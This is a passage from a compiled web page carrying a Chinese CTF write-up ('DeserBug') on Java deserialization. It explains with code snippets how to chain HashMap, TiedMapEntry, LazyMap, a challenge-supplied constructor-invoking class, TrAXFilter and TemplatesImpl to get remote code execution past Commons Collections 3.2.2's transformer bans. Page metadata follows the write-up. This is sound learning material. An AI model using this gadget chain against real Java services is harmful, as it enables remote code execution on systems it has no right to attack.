    <span class="token class-name">Constructor</span> con <span class="token operator">=</span> targetclass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>typeparam<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>typearg<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 同样能反射调用构造器！</span>
<span class="token punctuation">}</span>

<span class="token comment">// 2. 使用ConstantTransformer返回Myexpect对象</span>
<span class="token class-name">ConstantTransformer</span> transformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">setFieldValue</span><span class="token punctuation">(</span>transformer<span class="token punctuation">,</span> <span class="token string">&quot;iConstant&quot;</span><span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 返回自定义对象</span>

<span class="token comment">// 3. 触发getAnyexcept() - 利用JSON序列化</span>
</code></pre><p><strong>步骤4: 触发getAnyexcept() - 最巧妙的创新</strong></p><p>问题：<code>ConstantTransformer</code>只是返回对象，如何调用<code>getAnyexcept()</code>？</p><p>解决方案：</p><pre><code class="language-java"><span class="token comment">// 使用JSONObject作为LazyMap的底层Map</span>
<span class="token class-name">JSONObject</span> jsonObject <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">LazyMap</span> lazyMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>jsonObject<span class="token punctuation">,</span> transformer<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// 当LazyMap.get()触发时：</span>
<span class="token comment">// 1. transformer.transform() 返回 myexpect对象</span>
<span class="token comment">// 2. jsonObject.put(key, myexpect)  ← 关键！</span>
<span class="token comment">// 3. JSONObject序列化myexpect时会调用所有getter</span>
<span class="token comment">// 4. getAnyexcept()被自动调用！</span>
</code></pre><h4 id="完整对比" tabindex="-1"><a class="header-anchor" href="#完整对比"><span>完整对比</span></a></h4><pre><code class="language-java"><span class="token comment">// ========== CC3 (失效) ==========</span>
<span class="token class-name">TransformedMap</span><span class="token punctuation">.</span><span class="token function">setValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  → <span class="token class-name">InstantiateTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ❌ 被禁用
    → <span class="token keyword">new</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span>

<span class="token comment">// ========== CC6 (失效) ==========</span>
<span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  → <span class="token class-name">InvokerTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ❌ 被禁用
    → <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">// ========== MyPOC (成功) ==========</span>
<span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  → <span class="token class-name">ConstantTransformer</span><span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ✅ 未被禁用
    → 返回 <span class="token class-name">Myexpect</span>对象
      → <span class="token class-name">JSONObject</span><span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> myexpect<span class="token punctuation">)</span>
        → 触发<span class="token constant">JSON</span>序列化
          → 调用 <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  ✅ 自定义方法，不受限制
            → <span class="token class-name">Constructor</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
              → <span class="token keyword">new</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span>templates<span class="token punctuation">)</span>
                → templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> → <span class="token constant">RCE</span> ✅
</code></pre><hr><h3 id="改造要点总结" tabindex="-1"><a class="header-anchor" href="#改造要点总结"><span>改造要点总结</span></a></h3><h4 id="_1-触发方式-cc6-cc3" tabindex="-1"><a class="header-anchor" href="#_1-触发方式-cc6-cc3"><span>1. 触发方式：CC6 &gt; CC3</span></a></h4><ul><li>CC3的<code>AnnotationInvocationHandler</code>在JDK 8u71+后对memberValues类型进行安全检查而失效</li><li>CC6的<code>HashMap + TiedMapEntry</code>更通用，能适应高版本JDK</li></ul><pre><code>HashMap.readObject()
  → hash(key)  
  → TiedMapEntry.hashCode()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → transform(key)
</code></pre><h4 id="_2-攻击目标-cc3-cc6" tabindex="-1"><a class="header-anchor" href="#_2-攻击目标-cc3-cc6"><span>2. 攻击目标：CC3 &gt; CC6</span></a></h4><ul><li>CC6直接调用<code>Runtime.exec()</code>容易被SecurityManager拦截，并且题目中使用的Myexpect只能调用构造器，不能调用普通方法。</li><li>CC3的<code>TemplatesImpl</code>字节码加载更隐蔽</li></ul><p><strong>为什么不能直接用Runtime.exec()？</strong></p><p>有人可能会问：既然Myexpect能反射调用构造器，为什么不直接调用Runtime.exec()，而要用TemplatesImpl？</p><p>原因如下：</p><ol><li><strong>Myexpect的限制</strong>：</li></ol><pre><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getAnyexcept</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>
    <span class="token class-name">Constructor</span> con <span class="token operator">=</span> targetclass<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span>typeparam<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> con<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>typearg<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 只能调用构造器！</span>
<span class="token punctuation">}</span>
</code></pre><p>Myexpect只能调用构造器，不能调用普通方法。</p><ol><li><strong>Runtime的限制</strong>：</li></ol><pre><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Runtime</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Runtime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>  <span class="token comment">// 构造器是private的！</span>
    
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">Runtime</span> <span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>  <span class="token comment">// 需要通过静态方法获取实例</span>
    
    <span class="token keyword">public</span> <span class="token class-name">Process</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">String</span> command<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">}</span>  <span class="token comment">// 需要先获取实例再调用</span>
<span class="token punctuation">}</span>
</code></pre><ul><li>Runtime的构造器是private的，无法通过<code>new Runtime()</code>创建</li><li>必须先调用<code>Runtime.getRuntime()</code>获取实例</li><li>然后才能调用<code>exec()</code>方法</li></ul><ol><li><strong>执行流程对比</strong>：</li></ol><pre><code class="language-java"><span class="token comment">// ❌ 无法实现 - Runtime.exec()需要两步</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 构造器private，无法调用</span>
<span class="token comment">// 即使能获取实例，也无法调用exec()方法（Myexpect只调用构造器）</span>

<span class="token comment">// ✅ 可以实现 - TrAXFilter在构造器中触发</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTargetclass</span><span class="token punctuation">(</span><span class="token class-name">TrAXFilter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTypeparam</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
myexpect<span class="token punctuation">.</span><span class="token function">setTypearg</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span>templates<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 调用: new TrAXFilter(templates)</span>
<span class="token comment">// 构造器内部自动调用 templates.newTransformer() → 加载字节码 → RCE</span>
</code></pre><ol start="4"><li><strong>TrAXFilter的优势</strong>：</li></ol><pre><code class="language-java"><span class="token comment">// TrAXFilter构造器源码</span>
<span class="token keyword">public</span> <span class="token class-name">TrAXFilter</span><span class="token punctuation">(</span><span class="token class-name">Templates</span> templates<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransformerConfigurationException</span> <span class="token punctuation">{</span>
    _templates <span class="token operator">=</span> templates<span class="token punctuation">;</span>
    _transformer <span class="token operator">=</span> templates<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 构造器中就触发！</span>
<span class="token punctuation">}</span>
</code></pre><p>TrAXFilter的构造器会自动调用<code>templates.newTransformer()</code>，完美适配Myexpect只能调用构造器的限制。</p><p><strong>可选的攻击目标</strong>：</p><p>虽然不能用Runtime.exec()，但还有其他选择：</p><table><thead><tr><th>攻击目标</th><th>触发方式</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>TrAXFilter → TemplatesImpl</td><td>构造器触发</td><td>✅ 隐蔽、绕过安全管理器</td><td>需要字节码</td></tr><tr><td>ProcessBuilder → start()</td><td>❌ 需要调用方法</td><td>直观</td><td>❌ Myexpect不支持</td></tr><tr><td>ScriptEngineManager</td><td>构造器触发</td><td>可执行脚本</td><td>依赖nashorn</td></tr><tr><td>JNDI注入相关类</td><td>构造器触发</td><td>远程加载</td><td>需要外部服务</td></tr></tbody></table><p><strong>结论</strong>：MyPOC选择TrAXFilter → TemplatesImpl是因为：</p><ul><li>✅ 适配Myexpect只能调用构造器的限制</li><li>✅ 在构造器中就能触发恶意代码</li><li>✅ 不依赖SecurityManager配置</li><li>✅ 字节码加载更隐蔽</li></ul><h4 id="_3-绕过安全检查-关键创新" tabindex="-1"><a class="header-anchor" href="#_3-绕过安全检查-关键创新"><span>3. 绕过安全检查：关键创新</span></a></h4><table><thead><tr><th>传统方法</th><th>状态</th><th>改造方法</th><th>状态</th></tr></thead><tbody><tr><td>InstantiateTransformer</td><td>❌ 禁用</td><td>Myexpect.getAnyexcept()</td><td>✅ 可用</td></tr><tr><td>InvokerTransformer</td><td>❌ 禁用</td><td>Myexpect.getAnyexcept()</td><td>✅ 可用</td></tr><tr><td>直接调用</td><td>-</td><td>JSONObject触发getter</td><td>✅ 创新</td></tr></tbody></table><h4 id="_4-利用链组合" tabindex="-1"><a class="header-anchor" href="#_4-利用链组合"><span>4. 利用链组合</span></a></h4><pre><code>CC6的触发器 + CC3的攻击目标 + 自定义绕过 = MyPOC
</code></pre><hr><h3 id="触发方式选择-为什么使用cc6" tabindex="-1"><a class="header-anchor" href="#触发方式选择-为什么使用cc6"><span>触发方式选择：为什么使用CC6？</span></a></h3><p><strong>CC6的触发机制</strong>：</p><pre><code>HashMap.readObject()
  → hash(key)  
  → TiedMapEntry.hashCode()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → transform(key)
</code></pre><p><strong>选择CC6的原因</strong>：</p><ol><li><p><strong>JDK兼容性最好</strong></p><ul><li>HashMap反序列化机制是Java基础功能</li><li>不依赖特定JDK版本的实现细节</li><li>CC1、CC3等用到的AnnotationInvocationHandler在JDK 8u71+后对memberValues类型进行安全检查而失效</li></ul></li><li><p><strong>触发稳定可靠</strong></p><ul><li>HashMap.readObject()必然调用hash(key)</li><li>不像CC1/CC3中的TransformedMap需要key为&quot;value&quot;才能触发（因为@Retention注解只有value()成员方法）</li></ul></li></ol><hr><h3 id="核心要点" tabindex="-1"><a class="header-anchor" href="#核心要点"><span>核心要点</span></a></h3><ol><li><strong>题目约束</strong>: CC 3.2.2禁用了<code>InvokerTransformer</code>和<code>InstantiateTransformer</code></li><li><strong>突破方法</strong>: 利用题目提供的<code>Myexpect</code>类替代危险Transformer</li><li><strong>触发机制</strong>: Hutool JSON序列化时自动调用getter方法<code>getAnyexcept()</code></li><li><strong>利用链</strong>: HashMap → TiedMapEntry → LazyMap → ConstantTransformer → Myexpect → TrAXFilter → TemplatesImpl</li></ol><h3 id="关键技术" tabindex="-1"><a class="header-anchor" href="#关键技术"><span>关键技术</span></a></h3><ul><li><strong>反射调用构造器</strong>: <code>Myexpect.getAnyexcept()</code></li><li><strong>LazyMap延迟加载</strong>: 访问不存在的key触发transform</li><li><strong>TemplatesImpl字节码加载</strong>: 静态代码块执行命令</li><li><strong>时序控制</strong>: 先put后remove再替换，确保反序列化时正确触发</li></ul>`,208)])])}const r=s(e,[["render",o]]),k=JSON.parse('{"path":"/CodeAudittutorial/3-JavaVul/CTFDeserBug.html","title":"CTF - DeserBug","lang":"zh-CN","frontmatter":{"description":"CTF - DeserBug 目录 题目分析 漏洞分析 解题思路 完整POC实现 关键机制解析 CC链演变分析 题目分析 题目环境 Web服务: Hutool HTTP Server (端口8888) 依赖: Commons Collections 3.2.2 (带安全检查) hutool-all-5.8.18 JDK: JDK1.8.0_202 提示...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CodeAudittutorial/3-JavaVul/CTFDeserBug.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"CTF - DeserBug"}],["meta",{"property":"og:description","content":"CTF - DeserBug 目录 题目分析 漏洞分析 解题思路 完整POC实现 关键机制解析 CC链演变分析 题目分析 题目环境 Web服务: Hutool HTTP Server (端口8888) 依赖: Commons Collections 3.2.2 (带安全检查) hutool-all-5.8.18 JDK: JDK1.8.0_202 提示..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-12-17T15:25:28.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:modified_time","content":"2025-12-17T15:25:28.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"CTF - DeserBug\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-12-17T15:25:28.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"目录","slug":"目录","link":"#目录","children":[]},{"level":2,"title":"题目分析","slug":"题目分析","link":"#题目分析","children":[{"level":3,"title":"题目环境","slug":"题目环境","link":"#题目环境","children":[]},{"level":3,"title":"题目提供的关键文件","slug":"题目提供的关键文件","link":"#题目提供的关键文件","children":[]}]},{"level":2,"title":"漏洞分析","slug":"漏洞分析","link":"#漏洞分析","children":[{"level":3,"title":"漏洞点","slug":"漏洞点","link":"#漏洞点","children":[]},{"level":3,"title":"题目约束","slug":"题目约束","link":"#题目约束","children":[]},{"level":3,"title":"突破点","slug":"突破点","link":"#突破点","children":[]}]},{"level":2,"title":"解题思路","slug":"解题思路","link":"#解题思路","children":[{"level":3,"title":"核心思路","slug":"核心思路","link":"#核心思路","children":[]},{"level":3,"title":"技术选型","slug":"技术选型","link":"#技术选型","children":[]},{"level":3,"title":"完整利用链","slug":"完整利用链","link":"#完整利用链","children":[]},{"level":3,"title":"MyPOC.java (题目答案)","slug":"mypoc-java-题目答案","link":"#mypoc-java-题目答案","children":[]},{"level":3,"title":"POC关键点解析","slug":"poc关键点解析","link":"#poc关键点解析","children":[]}]},{"level":2,"title":"关键机制解析","slug":"关键机制解析","link":"#关键机制解析","children":[{"level":3,"title":"1. JSONObject.put 为什么能触发 getAnyexcept()？","slug":"_1-jsonobject-put-为什么能触发-getanyexcept","link":"#_1-jsonobject-put-为什么能触发-getanyexcept","children":[]},{"level":3,"title":"2. jsonObject.remove(\\"111\\") 的作用","slug":"_2-jsonobject-remove-111-的作用","link":"#_2-jsonobject-remove-111-的作用","children":[]},{"level":3,"title":"3. 为什么选择 TrAXFilter + TemplatesImpl？","slug":"_3-为什么选择-traxfilter-templatesimpl","link":"#_3-为什么选择-traxfilter-templatesimpl","children":[]}]},{"level":2,"title":"反序列化链拼接原理","slug":"反序列化链拼接原理","link":"#反序列化链拼接原理","children":[{"level":3,"title":"链的基本结构","slug":"链的基本结构","link":"#链的基本结构","children":[]},{"level":3,"title":"常见组件分类","slug":"常见组件分类","link":"#常见组件分类","children":[]},{"level":3,"title":"拼接三原则","slug":"拼接三原则","link":"#拼接三原则","children":[]},{"level":3,"title":"经典组合示例","slug":"经典组合示例","link":"#经典组合示例","children":[]},{"level":3,"title":"实战拼接步骤","slug":"实战拼接步骤","link":"#实战拼接步骤","children":[]},{"level":3,"title":"拼接核心思路总结","slug":"拼接核心思路总结","link":"#拼接核心思路总结","children":[]}]},{"level":2,"title":"从CC3/CC6到MyPOC的改造思路","slug":"从cc3-cc6到mypoc的改造思路","link":"#从cc3-cc6到mypoc的改造思路","children":[{"level":3,"title":"CC3链原理 (PureCC3POC.java)","slug":"cc3链原理-purecc3poc-java","link":"#cc3链原理-purecc3poc-java","children":[]},{"level":3,"title":"CC6链原理 (PureCC6POC.java)","slug":"cc6链原理-purecc6poc-java","link":"#cc6链原理-purecc6poc-java","children":[]},{"level":3,"title":"MyPOC的改造思路","slug":"mypoc的改造思路","link":"#mypoc的改造思路","children":[]},{"level":3,"title":"改造要点总结","slug":"改造要点总结","link":"#改造要点总结","children":[]},{"level":3,"title":"触发方式选择：为什么使用CC6？","slug":"触发方式选择-为什么使用cc6","link":"#触发方式选择-为什么使用cc6","children":[]},{"level":3,"title":"核心要点","slug":"核心要点","link":"#核心要点","children":[]},{"level":3,"title":"关键技术","slug":"关键技术","link":"#关键技术","children":[]}]}],"git":{"createdTime":1765985128000,"updatedTime":1765985128000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":1}]},"readingTime":{"minutes":13.65,"words":4095},"filePathRelative":"CodeAudittutorial/3-JavaVul/CTFDeserBug.md","localizedDate":"2025年12月17日","excerpt":"","autoDesc":true}');export{r as comp,k as data};
